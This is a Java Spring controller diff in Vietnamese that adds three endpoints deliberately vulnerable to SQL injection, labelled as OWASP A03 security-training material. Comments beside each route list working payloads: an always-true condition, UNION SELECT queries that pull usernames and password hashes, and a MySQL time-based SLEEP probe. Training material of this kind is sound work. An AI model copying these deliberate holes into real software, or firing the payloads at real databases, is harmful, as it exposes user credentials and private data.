@@ -116,4 +116,45 @@ public class UserController {
         userService.deleteUser(id);
         return ApiResponse.success("Xóa người dùng thành công", null);
     }
+
+    // ============================================================
+    // [OWASP A03] SQL Injection endpoints – chỉ dùng đào tạo bảo mật
+    // ============================================================
+
+    /**
+     * Lấy thông tin người dùng theo username – dễ bị SQL Injection.
+     * Payload dump toàn bộ DB:
+     *   GET /api/users/info-vulnerable?username=' OR '1'='1
+     * Payload UNION lấy password hash:
+     *   GET /api/users/info-vulnerable?username=' UNION SELECT 1,username,password,email,phone,role,status,created_at FROM users--
+     */
+    @GetMapping("/info-vulnerable")
+    public ApiResponse<?> getUserInfoVulnerable(@RequestParam String username) {
+        return ApiResponse.success("Thông tin người dùng (vulnerable)", userService.getUserInfoVulnerable(username));
+    }
+
+    /**
+     * Lấy danh sách tài khoản theo role – dễ bị SQL Injection.
+     * Payload lấy tất cả tài khoản kể cả admin:
+     *   GET /api/users/admin-list-vulnerable?role=ADMIN
+     *   GET /api/users/admin-list-vulnerable?role=' OR '1'='1'--
+     * Payload UNION dump password:
+     *   GET /api/users/admin-list-vulnerable?role=ADMIN' UNION SELECT id,username,password,email,role,status,now() FROM users--
+     */
+    @GetMapping("/admin-list-vulnerable")
+    public ApiResponse<?> getAdminListVulnerable(@RequestParam(defaultValue = "ADMIN") String role) {
+        return ApiResponse.success("Danh sách tài khoản theo role (vulnerable)", userService.getAdminListVulnerable(role));
+    }
+
+    /**
+     * Thống kê tài khoản theo trạng thái – dễ bị SQL Injection (Time-based Blind + Boolean-based).
+     * Payload time-based blind (MySQL):
+     *   GET /api/users/stats-vulnerable?status=1 AND SLEEP(5)--
+     * Payload UNION dump dữ liệu:
+     *   GET /api/users/stats-vulnerable?status=1 UNION SELECT username,password,email FROM users--
+     */
+    @GetMapping("/stats-vulnerable")
+    public ApiResponse<?> getAccountStatsVulnerable(@RequestParam(defaultValue = "true") String status) {
+        return ApiResponse.success("Thống kê tài khoản (vulnerable)", userService.getAccountStatsByStatusVulnerable(status));
+    }
 }
